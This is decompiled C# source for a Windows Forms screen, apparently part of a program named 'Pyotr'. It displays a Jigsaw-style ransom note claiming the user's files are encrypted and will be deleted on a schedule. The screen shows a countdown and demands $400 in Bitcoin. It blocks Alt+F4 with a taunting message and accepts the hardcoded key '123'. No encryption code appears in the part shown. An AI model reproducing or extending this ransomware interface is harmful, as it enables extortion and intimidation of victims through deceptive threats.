using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Pyotr.My;
using Pyotr.My.Resources;

namespace Pyotr;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	private double hour;

	private double minute;

	private double second;

	private int i;

	private string strmsg;

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label5_Click;
			Label label = _Label5;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label5 = value;
			label = _Label5;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(TextBox1_KeyDown);
			TextBox textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).remove_KeyDown(val);
			}
			_TextBox1 = value;
			textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).add_KeyDown(val);
			}
		}
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox TextBox2
	{
		[CompilerGenerated]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(TextBox2_KeyDown);
			TextBox textBox = _TextBox2;
			if (textBox != null)
			{
				((Control)textBox).remove_KeyDown(val);
			}
			_TextBox2 = value;
			textBox = _TextBox2;
			if (textBox != null)
			{
				((Control)textBox).add_KeyDown(val);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(Button1_KeyDown);
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_KeyDown(val);
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_KeyDown(val);
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Control)this).add_KeyDown(new KeyEventHandler(Form2_KeyDown));
		((Form)this).add_Load((EventHandler)Form2_Load);
		hour = 71.0;
		minute = 59.0;
		second = 59.0;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b8: Expected O, but got Unknown
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0338: Expected O, but got Unknown
		//IL_03ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b5: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_04eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f5: Expected O, but got Unknown
		//IL_0593: Unknown result type (might be due to invalid IL or missing references)
		//IL_059d: Expected O, but got Unknown
		//IL_0636: Unknown result type (might be due to invalid IL or missing references)
		//IL_0640: Expected O, but got Unknown
		components = new Container();
		PictureBox1 = new PictureBox();
		Label1 = new Label();
		Timer1 = new Timer(components);
		Panel1 = new Panel();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		Timer2 = new Timer(components);
		Label5 = new Label();
		TextBox1 = new TextBox();
		Label6 = new Label();
		TextBox2 = new TextBox();
		Button1 = new Button();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)PictureBox1).set_Dock((DockStyle)5);
		PictureBox1.set_Image((Image)(object)Resources.Pyotr);
		((Control)PictureBox1).set_Location(new Point(0, 0));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(901, 601));
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Black);
		((Control)Label1).set_Font(new Font("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Lime);
		((Control)Label1).set_Location(new Point(12, 18));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 16));
		((Control)Label1).set_TabIndex(1);
		Timer1.set_Interval(10);
		((Control)Panel1).set_BackColor(Color.Black);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)Label4);
		((Control)Panel1).get_Controls().Add((Control)(object)Label3);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).set_ForeColor(Color.DarkRed);
		((Control)Panel1).set_Location(new Point(12, 298));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(252, 100));
		((Control)Panel1).set_TabIndex(2);
		((Control)Panel1).set_Visible(false);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Tahoma", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_Location(new Point(142, 10));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(103, 77));
		((Control)Label4).set_TabIndex(2);
		Label4.set_Text("00");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Tahoma", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_Location(new Point(93, 10));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(56, 77));
		((Control)Label3).set_TabIndex(1);
		Label3.set_Text(":");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Tahoma", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(-2, 10));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(103, 77));
		((Control)Label2).set_TabIndex(0);
		Label2.set_Text("00");
		Timer2.set_Interval(1000);
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Black);
		((Control)Label5).set_Font(new Font("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Lime);
		((Control)Label5).set_Location(new Point(9, 429));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(498, 16));
		((Control)Label5).set_TabIndex(3);
		Label5.set_Text("Please, send at least $400 worth of BitCoin here:");
		((Control)Label5).set_Visible(false);
		((TextBoxBase)TextBox1).set_BackColor(Color.Black);
		((Control)TextBox1).set_Font(new Font("Lucida Console", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox1).set_ForeColor(Color.Lime);
		((Control)TextBox1).set_Location(new Point(12, 448));
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		((Control)TextBox1).set_Size(new Size(100, 20));
		((Control)TextBox1).set_TabIndex(4);
		((Control)TextBox1).set_Visible(false);
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Black);
		((Control)Label6).set_Font(new Font("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.Lime);
		((Control)Label6).set_Location(new Point(9, 497));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(268, 16));
		((Control)Label6).set_TabIndex(5);
		Label6.set_Text("Enter Decryption Key Here:");
		((Control)Label6).set_Visible(false);
		((TextBoxBase)TextBox2).set_BackColor(Color.Black);
		((Control)TextBox2).set_Font(new Font("Lucida Console", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox2).set_ForeColor(Color.Lime);
		((Control)TextBox2).set_Location(new Point(283, 497));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(214, 20));
		((Control)TextBox2).set_TabIndex(6);
		((Control)TextBox2).set_Visible(false);
		((ButtonBase)Button1).set_BackColor(Color.Yellow);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(12, 525));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(252, 23));
		((Control)Button1).set_TabIndex(7);
		((ButtonBase)Button1).set_Text("I made a payment,  now give me my files back");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)Button1).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(901, 601));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(" ");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("Lol You Can't close me", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			e.set_Handled(true);
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(hour));
		Label4.set_Text(Conversions.ToString(minute));
		strmsg = "I want to play a game with you. Let me explain the rules:" + Environment.NewLine + "Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine + "But, don't worry! It will only happen if you don't comply." + Environment.NewLine + "Howeever I've already encrypted your personal files, so you cannot access them." + Environment.NewLine + Environment.NewLine + "Every hour I select some of them to delete permanently," + Environment.NewLine + "therefore I won't be able to access them, either." + Environment.NewLine + "Are you familiar with the concept of exponential growth? Let me help you out." + Environment.NewLine + "It starts out slowly then increases rapidly." + Environment.NewLine + "During the first 24hour you will only lose a few files," + Environment.NewLine + "the second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine + Environment.NewLine + "If you turn off your computer or try to close me, when I start next time" + Environment.NewLine + "you will get 1000 files deleted as a punishment." + Environment.NewLine + "Yes you will want me to start next time, since I am the only one that is capable to " + Environment.NewLine + "decrypt your personal data for you." + Environment.NewLine + "                         Now, let's start and enjoy our little game together!";
		Timer1.set_Enabled(true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		checked
		{
			i++;
			Label label;
			(label = Label1).set_Text(label.get_Text() + strmsg.Substring(i - 1, 1));
			if (i == strmsg.Length)
			{
				Timer1.set_Enabled(false);
				Timer2.set_Enabled(true);
				((Control)Panel1).set_Visible(true);
				((Control)Label5).set_Visible(true);
				((Control)TextBox1).set_Visible(true);
				((Control)TextBox2).set_Visible(true);
				((Control)Label6).set_Visible(true);
				((Control)Button1).set_Visible(true);
			}
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(hour));
		Label4.set_Text(Conversions.ToString(minute));
		if (minute == 0.0)
		{
			hour -= 1.0;
			minute = 59.0;
		}
		else if (second == 0.0)
		{
			minute -= 1.0;
			second = 59.0;
		}
		else
		{
			second -= 1.0;
		}
	}

	private void Button1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("Lol You Can't close me", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			e.set_Handled(true);
		}
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("Lol You Can't close me", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			e.set_Handled(true);
		}
	}

	private void TextBox2_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("Lol You Can't close me", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			e.set_Handled(true);
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox2.get_Text(), "123", false) == 0)
		{
			((Control)MyProject.Forms.Form3).Show();
		}
	}

	private void Label5_Click(object sender, EventArgs e)
	{
	}
}
